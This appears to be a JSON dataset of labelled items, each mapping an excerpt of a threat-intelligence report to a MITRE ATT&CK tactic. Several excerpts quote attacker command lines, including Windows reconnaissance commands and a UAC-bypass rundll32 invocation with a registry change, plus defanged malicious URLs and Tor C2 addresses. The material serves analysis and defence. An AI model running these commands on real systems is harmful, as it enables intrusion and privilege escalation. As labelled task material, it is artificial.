        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors were seen using remote thread creation to inject into lsass to extract credentials.\nThe same activity as seen via a the larger process tree.\nDiscovery\nBazar initiated some discovery activity within 10 minutes of executing.\nCobalt Strike initiated the following discovery commands:\nOn the domain controller the following discovery was run:\nThe following PowerShell command was executed from the domain controller.\nDecoded:\nSystems were pinged from the domain controller to confirm connectivity.\nFour days into the intrusion the threat actors dropped and executed Advanced_IP_Scanner_2.5.3850.exe which kicked off a scan of the network.\nAWS was used to get the public IP of the infected machine, multiple times.\nMinutes before deployment of Ryuk the threat actors usually drop the following files, usually on a domain controller. This time they dropped the files on a domain controller in C:\\info\nThe exact files were mentioned in ourBazar, No Ryukreport.\nstart.bat was executed with the following:\nThis script and files are available @https://thedfirreport.com/services/",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actor gained access to the environment after a user opened an Excel document and enabled macros. The document came in via email in the form of a zip file which included an xls file. Thanks for sharing@proxylife!\nThe document contains hidden sheets, has white characters on a white background, and is attributed to SilentBuilder with Emotet, epoch5.\nTo deobfuscate the document the tool xlmdeobfuscator was used with the following output.\nAfter deobfuscation and cleaned up, the code in the macro looks as follows.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: On the file server via a RDP session, they used the Edge browser to download WinRAR and used it to begin compressing file share data into an archive. Here we used Dissect'sEdge browser pluginto extract data collected through KAPE.\nThey then executed WinRAR with the following command to compress a file share folder.",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors made use of pass the hash techniques to try to escalate privileges during the intrusion. Various accounts were targeted including a Guest account initially.\nProcess injection was seen from the Cobalt Strike beacon into a svchost process running with System level privilege.",
        "output": "privilege escalation",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Credentials were dumped on a server and domain controller using a Cobalt Strike Beacon.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In September 2020, the US Department of Justice released a series of indictments against members of the APT41 group, charging them with a high number of computer intrusions against a variety of targets, both in the private and public sectors, some of which included high-profile supply chain attacks. The intrusion set described in this report, and in other public accounts we referred to, shows that the group did not cease to be active despite these legal proceedings. \nMoreover, it is evident that the group maintains a high level of proficiency and sophistication in the development of its toolset, gaining a foothold in new areas like UEFI firmware. In this sense, the group has introduced its own innovation to this landscape \u2013 patching an existing benign core component in the firmware (rather than adding a new driver to it), thereby turning the UEFI firmware into a highly stealthy and persistent storage for malware in the system. \nFollowing previous predictions, we can now say that UEFI threats are gradually becoming a norm. With this in mind, vendors are taking more precautions to mitigate attacks like MoonBounce, for example by enabling Secure Boot by default. We assess that, in this ongoing arms race, attacks against UEFI will continue to proliferate, with attackers evolving and finding ways to exploit and bypass current security measures. \nAs a safety measure against this attack and similar ones, it is recommended to update the UEFI firmware regularly and verify that BootGuard, where applicable, is enabled. Likewise, enabling Trust Platform Modules, in case a corresponding hardware is supported on the machine, is also advisable. On top of all, a security product that has visibility into the firmware images should add an extra layer of security, alerting the user on a potential compromise if such occurs. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: A widespread malicious email campaign that broadly targeted many companies in unrelated industries blasted generic lures with an attached OneNote file claiming to contain an unspecified \"secure message.\" The campaign was documented in open-source threat intelligence bypr0xylifeon theirGitHub repository. The campaign ID used by threat actor was 3329953471, embedded in the configuration data in the IcedID DLL payload.\nAccording to Proofpoint Threat Research, the campaign was not very large in message volume compared to other campaigns, with fewer than one thousand messages observed over two days, broadly targeting companies across Manufacturing, Technology, Energy, Retail, Insurance, and several other sectors. The threat actor behind the campaign used techniques similar to two tracked threat actors but did not provide enough unique attributes to strongly attribute the campaign to either one of them.\nThe OneNote file used to gain initial access in this case was not very sophisticated. A Windows batch file named \"O p e n.cmd\" was hidden behind a large button marked \"Open\" in the OneNote file with a blurred image of a document in the background and simple instructions in the foreground to double click the button.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: SideWinder continues to attack its usual targets, especially government, military, and diplomatic entities. The targeted sectors are consistent with those observed in the past, but it is worth mentioning that the number of attacks against the maritime and the logistics sectors has increased and expanded to Southeast Asia. \nFurthermore, we observed attacks against entities associated with nuclear energy. The following industries were also affected: telecommunication, consulting, IT service companies, real estate agencies, and hotels. \nCountries and territories targeted by SideWinder in 2024 \nOverall, the group has further extended its activities, especially in Africa. We detected attacks in Austria, Bangladesh, Cambodia, Djibouti, Egypt, Indonesia, Mozambique, Myanmar, Nepal, Pakistan, Philippines, Sri Lanka, the United Arab Emirates, and Vietnam. \nIn this latest wave of attacks, SideWinder also targeted diplomatic entities in Afghanistan, Algeria, Bulgaria, China, India, the Maldives, Rwanda, Saudi Arabia, Turkey, and Uganda. ",
        "output": "other",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Trickbot:\nThe initial Trickbot traffic can be seen in blue, followed by the Cobalt Strike traffic in red:\nhttps://tria.ge/210617-6hxwajevbs\nCobalt Strike:\nExample request:",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From the beachhead host credentials appear to have been dumped from an injection into the SearchIndexer process on the host. Data observed using sysmon event id 10 shows the use of theSearchIndexer process, similar to behaviorobserved in a prior case, followed by known Cobalt Strikemalleable profilenamed pipes.\nShortly after the credential dump using the SearchIndexer process, the Cobalt Strike process ran Invoke-Kerberoastlooking for roastableaccounts within the organization.\nWe observed Cobalt Strike beacons accessing LSASS on multiple occasions, on almost every compromised host.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA observed the threat actor using the techniques identified in table 9 for collection within the victim environment. ",
        "output": "collection",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The only credential access observed was through Zerologon, which was used to retrieve the domain administrator's NTLM hash.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We were unable to identify the initial compromise vectors. For most cases, the attackers seemed to have had privileged access inside the local network, such as domain administrator credentials.\nAt Victim D, the attackers gained access to an admin console and used it to deploy implants on other machines in the local network. It is probable that they first compromised the machine of a sysadmin or security analyst and then stole credentials that allowed them to connect to the console.\nAt Victim F, the implants were delivered usingImpacket, which means that the attackers somehow previously compromised a high-privilege domain account.",
        "output": "initial access",
        "source": "Weblive"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat actors usually use this stage to obtain more information about the infected computer and its local network. At this point, cybercriminals most often leverage the tools built into the operating system. \nAccount Discovery  T1087 \nThe Net utility is used to display information about the computer's network configuration. The utility helped the adversaries gather information about domain group membership and collect lists of administrators. \nnet user /domain > 1.txt net user net localgroup administrators net accounts /domain net group \"Domain Admins\" \nSystem Information Discovery  T1082 \nAt this stage, the attackers gathered information about the system basic configuration (e.g., the Windows version or system architecture). \necho %PROCESSOR_ARCHITECTURE% systeminfo whoami net config Workstation \nPermission Groups Discovery  T1069 \nThe adversary obtained a list of objects from Windows groups as follows: \nnet group \"Domain Admins\" /domain net group \"domain Controllers\" net group \"Exchange Servers\" net group \"Schema Admins\" net group \"Protected Users\" net group \"Enterprise Admins\" net group \"Enterprise Read-only Domain Controllers\" net group \"Exchange Domain Servers\" \nThe hackers made queries to the registry to obtain information about the currently used RDP ports or network configurations. \nreg query \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server\\WinStations\\RDPTcp /v PortNumber\" reg query   \n\"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" reg query \"HKEY_LOCAL_MACHINE   \n\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\{1f777394-0b42-11e3- 80ad-806e6f6e6963}\" \nDomain Trust Discovery  T1482 \ndsquery site \nSystem Time Discovery  T1124 net time /domain \nProcess Discovery  T1057 \nIn some cases, the threat actors conducted reconnaissance on remote devices to establish whether files with certain names were running on them. The attackers had downloaded these files to remote devices earlier. \ntasklist /pid 1428 /f tasklist /s 172.16.2.132 /u test\\administrator /p {redacted} tasklist | findstr update_x64.exe \nNetwork Service Scanning  T1046 \nAt this stage, the threat actors also used a publicly available tool called cping to identify local computers vulnerable to SMB attacks. \nC:\\PerfLogs\\cping40.exe scan smbvul 10.0.0.1 10.0.10.1 > 10.txt cping40.exe scan smbvul 192.168.20.1 192.168.29.1 > 30.txt \nNetwork Share Discovery  T1135 \nThe threat actors attempted to detect available network drives: \nnet share net view /DOMAIN \nSystem Network Configuration Discovery  T1016 \nOne of the ways in which the threat actor obtained information about the available network configuration was to access the registry key directly: \nreg query \"HKEY_LOCAL_MACHINE   \n\\SYSTEM\\CurrentControlSet\\services\\Tcpip\\Parameters\\Interfaces\\{1f777394-0b42-11e3-   \n80ad-806e6f6e6963}\" \nSystem Network Connections Discovery  T1049 \nTo identify network connections, the hackers used a built-in utility called netstat: \nnetstat -ano netstat -r netstat -an netstat -aon|findstr \"8080\" netstat -ano | findstr dns.exe \nRemote System Discovery  T1018 \nThe hackers used the Ping command with a single echo request to identify other devices on the local network. In order to simplify their tasks, they used a FOR loop. They also used the SETSPN utility to identify on which devices in the domain a particular service was running. This helped the attackers identify which devices were running the following services: IIS, SQL and MSSQL. \nIt is important to note that in one of the cases we analyzed, the threat actors used the \"payload\" string instead of the necessary one, which indicates that the command was copied from another source. \nping -n 1 PIST-FILE-SRV for /l %i in (1,1,255) do @ping 172.67.204.%i -w 1 -n 1|find /i \"ttl=\" setspn -T [target_company_name4] -Q \\*/\\* | payload setspn -T [target_company_name6] -Q \\*/\\* | findstr IIS setspn -T [target_company_name5] -Q \\*/\\* | findstr SQL setspn -T [target_company_name6] -Q \\*/\\* | findstr MSSQL ",
        "output": "discovery",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: SUNBURST uses a two-part C2 protocol that involves both DNS and HTTP. In \"passive\" mode, the backdoor communicates with its C2 coordinator via DNS and receives high-level updates to its state. For example, the C2 coordinator may tell the backdoor to go to sleep or spring into action. When the backdoor is in \"active\" mode, it communicates via HTTP to its final C2 server and receives detailed commands such as \"spawn a process\" or \"transfer a file\". ",
        "output": "command and control",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After around two hours into the intrusion, the threat actor transferred PDQ Deploy and the LockBit Black executable, under the C:\\Temp folder on the beachhead host. The same files were then also created on the domain controller.PDQ Deployis a software tool designed for automating patch management and deploying applications. In this case, it was leveraged to facilitate the deployment of the LockBit ransomware.\nBefore the threat actor used PDQ they first ran the LockBit binary manually over RDP sessions on the back server and file server.\nThe next deployment process began with PDQ Deploy being executed from the beachhead system. Organizations can utilize the PDQ Deploy to remotely and efficiently create multi-step deployments for end users, supporting various formats such as .exe, .msi, .bat, .ps1, and .vbs. PDQ Deploy allows administrators to execute scripts and commands (e.g., PowerShell, VBScript, and batch files) on remote computers and groups integrated with Spiceworks, Active Directory, or PDQ Inventory. The tool also provides deployment reports to monitor and track successful deployments.\nPDQ Deploy operates through two Windows services:\nPDQDeployService.exeis the background service that manages all schedules and deployments on the console. \nPDQDeployRunner-n(e.g., PDQDeployRunner-1) is the target service executed on remote hosts to perform the deployments.\nDuring deployment, the target service and installation files for the deployment package are copied to a directory on the target computer's default share, enabling the execution of deployment tasks.\nTo facilitate the ransomware deployment with PDQ the threat actor created a file called asd.bat to launch the LockBit executable.\nasd.bat content:\nWe were able collect the PDQ .db files from C:\\ProgramData\\Admin Arsenal\\PDQ Deploy\\ on the beachhead to see the deployment data created by the threat actor.\nThreat actor logged in via their 'backup' user:\nDomain Admin User/Credentials used to deploy:\nFiles included in PDQ library:\nSeveral runs of the deployment package by the threat actor:\nSeveral ways to attempt to execute the ransomware including calling the file, command arguments, and finally the batch file:\nOnce the threat actor started the deployment we observed both PDQ service runners and the package files (ransomware and batch file) being deployed over SMB.\nThis batch file was then executed on hosts across the environment via the PDQ runner.\nAfter completing the deployment using PDQ, the threat actor connected to an Exchange server using RDP. They issued a few commands to stop running processes associated with Exchange and SQL on the server:\nThey then dropped a batch file, test.bat, which contained a list of the systems found earlier during the intrusion, as well as a ransomware execution command. This appears to have been a backup to try and hit systems that may have been missed during the PDQ deployment.\nBelow is an extract of the test.bat contents:\nAfter the ransomware attack was completed, the affected files were renamed with the .rhddiicoE extension, and a ransom note titled rhddiicoE.README.txt was left on the compromised hosts.\nAdditionally, the desktop background image was modified as part of the ransomware execution.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1021.001: Remote Desktop Protocol T1021.002: SMB/Windows Admin Shares T1021.004: SSH ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We will continue using the same DISM system utility and DLL file for lateral movement. The HOGWARTS\\adumbledore user has administrative access to the remote host 192.168.1.101 in this example. We transfer the DISM system utility and the associated DLL file via the SMB protocol to the remote host as shown in Figure 18. \nThen we setup a SOCKS proxy in our initial beacon, and use Impacket's wmiexec.py to execute our payload via the Windows Management Instrumentation (WMI) protocol, as shown in Figure 19 and Figure 20. ",
        "output": "lateral movement",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Upon gaining access to an organization, DEV-0270 performs a series of discovery commands to learn more about the environment. The command wmic computersystem get domain obtains the target's domain name. The whoami command displays user information and net user command is used to add or modify user accounts. For more information on the accounts created and common password phrases DEV-0270 used, refer to the Advanced Hunting section. \nwmic computersystem get domain   \nwhoami   \nnet user \nOn the compromised Exchange server, the actor used the following command to understand the target environment. \nGet-Recipient | Select Name -ExpandProperty EmailAddresses -first 1 | Select SmtpAddress |  ft -hidetableheaders \nFor discovery of domain controllers, the actor used the following PowerShell and WMI command. ",
        "output": "discovery",
        "source": "microsoft"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although it may not currently appear to be widespread, Repellent Scorpius is actively hiring IAB and network intruders. It has also recently set up a RaaS affiliate program. Therefore, we can expect to see attackers posting a growing list of active incidents and victims on their leak site in the near future.\nThe TTPs highlighted here are from specific incident response engagements. Considering that the Cicada3301 ransomware is relatively new, we expect that its TTPs will change and evolve over time.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: CISA also observed the threat actor using open-source tools such as Plink and TightVNC for lateral movement. CISA observed the threat actor using the techniques identified in table 8 for lateral movement within the victim environment. \nTable 8: Lateral movement techniques ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Threat Intelligence shows that LAPSUS $\\$9$ utilise multiple methods to gain Initial access. \nThe main source of initial access is believed to occur via stolen authentication cookies which would grant the attacker access to a specific application. These cookies are usually in the form of Single sign-on (SSO) applications which would allow the attacker to pivot into other corporate applications ultimately bypassing controls such as multifactor authentication (MFA). ",
        "output": "initial access",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After discovery, defense evasion was the second most prevalent category for a number of techniques reported in 2022. However, the vast majority follow many of the same themes.\nProcess injection led the way in this category. Process injection was used both by initial access malware like Qbot, and as even more commonly observed, used by post-exploitation tools.\nProcess injection by Qbot into msra.exe fromQbot Likes to Move It, Move It.\nSysmon Event ID 8 logs showing Cobalt Strike injection fromEmotet Strikes Again  LNK File Leads to Domain Wide Ransomware\nCobalt Strike injected process using YARA signatures fromBumbleBee Zeros in on Meterpreter\nInjected Cobalt Strike from Volatility malfind data from theQuantum Ransomwarereport.\nAfter process injection, another notable category is the pair of techniques T1218.010 and T1218.011, the use of Rundll32 and Regsvr32 as some of the favored tools in use by threat actors to execute their payloads. Again, like process injection, this can be observed both by initial access malware and later post-exploitation tools.\nFor example, we can see Regsvr32 being utilized both in execution of the IcedID malware and later on to execute the ransomware binary fromStolen Images Campaign Ends in Conti Ransomware.\nAnd in that same case, the scheduled task used Rundll32 to execute the IcedID payload.\nAs mentioned in the initial access section, we observed the move away from various macro initial access files like Word and Excel and the beginning of utilizing file formats which bypass the Mark-of-the-Web such as ISO, IMG, VHD, etc. The Bumblebee malware was a trail blazer in this, three different reports utilized ISO files with LNK and DLL files contained within.\nBumbleBee Roasts Its Way to Domain Admin \nBumbleBee: Round Two \nBumbleBee Zeros in on Meterpreter\nWe also observed IcedID using this technique as well.\nQuantum Ransomware\nWe expect to see continued use of this technique going forward as initial access brokers continue to evolve alongside new security controls.",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: T1047 Windows Management Instrumentation   \nT1053 Scheduled Task/Job T1053.003 Cron T1053.005 Scheduled Task \nT1059.003 Windows Command Shell 1 T1059.004 Unix Shell T1059.005 Visual Basic T1059.006 Python T1569.002 Service Execution T1204 User Execution ",
        "output": "execution",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Attacks targeting PoS devices have been occurring for many years, and show no sign up stopping in the near future. The universal rollout of \"chip and pin\" will likely deter traditional attacks facing PoS devices. This has been witnessed in Europe, where EMV technology has been widely adopted for a number of years. In such situations, the attackers typically change tactics. Instead of targeting PoS devices, attackers target e-commerce websites instead, dumping databases from these webservers and acquiring card data.\nIn general, intrusion techniques targeting PoS devices are often no different from techniques targeting other Internet or network-connected machines. The main difference lies in the payload, which these days are typically a keylogger, or much more commonly, a memory scraper. These payloads, or malware families, have evolved over time to become heavily automated. Such automation allows attackers to infect hundreds or thousands of machines at a time, and make changes at the click of a button.\nThose charged with the task of securing PoS devices should take necessary precautions in order to help prevent the theft of card data. Such precautions include, but are not limited to:\nEnsure PoS devices are not directly connected to the Internet. If required, proper controls should be enabled to only allow connections to specific hosts over specified network protocols. \nWeb browsing should be disabled completely on PoS devices if possibly. If not possible, controls should be enabled that restrict browsing to specific websites. \nPrevent unauthorized users from installing or running executables on PoS devices using process allowlisting. \nInstall security software, such as antivirus, on PoS devices. \nUpdate all necessary operating system patches. \nImplement network segmentation between PoS devices and other corporate infrastructure. \nEnsure any remote access applications, such as RDP, VNC, LogMeIn, etc. are configured with unique usernames and passwords, are fully up to date on patches, and are configured with 2-factor authentication if possible. \nProperly log host and network-based events.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After dropping a copy of itself, it executes the dropped copy as Administrator using a UAC (User Account Control) bypass technique. It implements a variation of the technique ucmDccwCOMMethod in UACMe, thereby abusing the built-in Windows AutoElevate backdoor.\nIt first checks whetheratcuf32.dll, aswhook.dll, andavp.exeare loaded in the system. These files are from security defenders BitDefender, Avast, and Kaspersky, respectively. If one of these is loaded, it does not proceed to the UAC bypass routine. It then drops a shortcut file to <%User Temp%\\{random file name}.lnk> that contains the command line\nrundll32.exe SHELL32,ShellExec_RunDLL \"C:\\Windows\\system32\\ODBCCONF.EXE\" /a {configsysdsn OCNKBENXGMI etba odjcnr} /A {installtranslator fxodi} -a {installdriver qmprmxf} /a {configsdn HHAP} regsvr \"{dropped copy path and file name}.\" /S /e -s\nIt then creates an elevated COM object for CMLuaUtil and uses it to set a custom display calibrator in the registry that points to the dropped LNK file. It sets the custom display calibrator by setting the registry value\nHKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\ICM\\CalibrationDisplayCalibrator = \"%User Temp%\\{random file name}.lnk\"\nIt then creates an elevated COM object for ColorDataProxy and calls its method \"LaunchDccw\" to load the calibrator, thus executing the malicious LNK. Afterward, it sets the registry value DisplayCalibrator to \"%SystemRoot%\\System32\\DCCW.exe\" to hide its activity.\nMain routine\nRunning in Session 0, the real payload attempts to connect to the hard-coded Tor addresses, where the connections are made in another process. For the real payload to facilitate the exchange of information and the Tor-connecting process, a shared-named memory map is created with the following format:\nThe Tor address is written to offset 14h of the shared memory, hard-coded but encrypted within the sample itself. The following are some of the .onion (V2) addresses we identified:\nsejnfjrq6szgca7v \nzdfsyv3rubuhpql3 \nihdhoeoovbtgutfm \ntapeucwutvne7l5o \n2qlvvvnhqyda2ahd \nanswerstedhctbek \n5j7saze5byfqccf3 \ncmgvqnxjoiqthvrc \n3bbaaaccczcbdddz \nsgvtcaew4bxjd7ln \nugw3zjsayleoamaz \nynvs3km32u33agwq \nnjalladnspotetti \npsychonaut3z5aoz \nhabaivdfcyamjhkk \ntorwikignoueupfm \nbitmailendavkbec \ncyphdbyhiddenbhs \nclgs64523yi2bkhz \n76qugh5bey5gum7l \nhd37oiauf5uoz7gg \nexpressobutiolem \ngl3n4wtekbfaubye \narchivecaslytosk \nkyk55bof3hzdiwrm \nqqvyib4j3fz66nuc \nbcwpy5wca456u7tz \npornhubthbh7ap3u \nfncuwbiisyh6ak3i\nIn starting its Tor client process, the real payload randomly selects a name among these first:\ndllhost.exe \nregsvr32.exe \nrundll32.exe\nIt then creates a suspended process, injects the code of the Tor client, resumes the process, and waits for data from the Tor client. As far as what the sample does to the received data, we have not seen any use of it in the wild so far since we did find that the buffer containing the data is freed without using it.",
        "output": "privilege escalation",
        "source": "Trendmicro"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: IcedID initial Environment Discovery\nSeveral discovery commands executed from IcedID after the initial execution:\nCobalt Strike Beacon Discovery\nCobalt Strike'sappinoBeacon, ran discovery commands upon initial execution:\nActive Directory Domain Discovery\nDiscovering domain controllers prior to pivoting:\nAfter discovering and pivoting to the Domain Controller, threat actors used bothAdFindandBloodHoundto explore the Active Directory Domain.ExecutingAdfindon the Domain Controller:\nEvidence ofBloodHoundexecution on the Domain Controller:\nThe threat actors also executed PowerViewInvoke-ShareFindermodule on the beachhead host:\nDecoded command:\nThe threat actors also executed PowerViewInvoke-FindLocalAdminAccessmodule on one of the compromised servers:\nDecoded command:\nWe also saw exhaustive port scanners of certain servers before additional discovery.\nFile and Directory Discovery\nThe following discovery commands were run on all hosts including the Domain Controllers:",
        "output": "discovery",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed that the malware operator attempted to create SSH tunnels to a remote server located in South Korea from several compromised server hosts. They used a custom tunneling tool to achieve this. The tool receives four parameters: client IP address, client port, server IP address and server port. The tool offers basic functionality, forwarding client traffic to the server. In order to create a covert channel, the malware encrypts forwarded traffic using trivial binary encryption. ",
        "output": "exfiltration",
        "source": "securelist"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Archiving\nThe threat actor used 7z to archive data output from running the Get-DataInfo.ps1 PowerShell script.\nSysmon eventID 1 showing execution of 7z.exe archiving data:\nLooking for interesting files\nIn their pursuit of valuable data, the threat actor browsed through file systems, selectively opening files they deemed interesting. Documents containing passwords, financial information, and other sensitive data were specifically targeted, as these types of files typically hold high value for the intruders.\nSysmon eventID 1 showing Notepad and Wordpad used to open and look at files:",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In one incident LAPSUS\\$ were observed to sporadically move through the victim environment via RDP in an attempt to access resources deeper in the victim environment. In some instances, victim controlled hostnames were revealed including the host \"VULTR-GUEST\" which refers to infrastructure hosted on the private cloud service, Vultr[3]. ",
        "output": "lateral movement",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As is the case for many intrusions, initial access was obtained through an email campaign. Reports by Proofpoint point to this campaign using the404 Traffic Distribution System (TDS) service. The followingProofpoint screenshotshighlight how \"404 TDS\" is leveraged to turn email campaigns into drive-by downloads.\nDuring this intrusion, the TDS redirection wasreported by Proofpointas follows:\nhxxps[:]//hrcbishtek[.]com/{5 alphanumeric characters} \nhxxps[:]//imsagentes[.]pe/dgrjfj \nhxxps[:]//imsagentes[.]pe/dgrjfj/ \nhxxps[:]//ecorfan[.]org/base/sj/Document_may_24_16654.exe\nThe resulting hxxps[://]ecorfan[.]org/base/sj/Document_may_24_16654[.]exe URL performed a drive-by download, delivering the initial Truebot payload Document_may_24_16654.exe.\nThe usage of the deceptive Document_may_24_16654.exe naming would then entice fooled users to open what they believe is a recent document.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Downeks achieves host persistence through either the registry \"run\" key or with a shortcut in the start-up folder.",
        "output": "persistence",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors wrote a batch script (1.bat) that contained commands for establishing persistence on the compromised host. We see the creation of a new account and adding this account to the local administrators group.\nThey also made remote RDP connections possible by changing thefDenyTSConnectionsandUserAuthenticationvalues to 0.\nFull Contents of 1.bat\nWe later see the threat actors writing another batch file to disk and executing it. The kit.bat script contained a scheduled task that would run the kit.bat script on an hourly basis.\nAs explained in the execution tactic above, the threat actors installed a malicious WMI event subscription by including a VBScript that would execute on the compromised host. This was used as a method of persistence. The VBScript would execute every day at 23:00 of the host local time.\nDecompiled .mof file containing the WMI event subscription.\nBreaking down the above screenshot, the WMI event subscription contains the below malicious EventConsumer and EventFilter classes:\nEvent Consumer:\nClass Name: ASEventConsumerdr \nContent: VBScript\nEvent Filter:\nName: EFNMdr (randomly named) \nTrigger: Every day at 23:00 local time\nLooking into the VBScript, we notice that it is reaching out to the domain mymst007[.]info on port 4000 to download one more file and save it as temp file.\nWMI EventConsumer VBScript:\nWe used the below python code to emulate the VBScript and download the next stage payload:\nSecond stage payload downloaded and executed:\nThe final method of persistence we observed was the addition of an entry into the Image File Execution Option (IFEO) registry key. By changing the Debugger value to a different executable, an attacker used IFEO to launch a program other than the intended one. In this case, threat actors modified the below registry key to launch the miner executable (smss.exe) instead of the svchost.exe binary.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
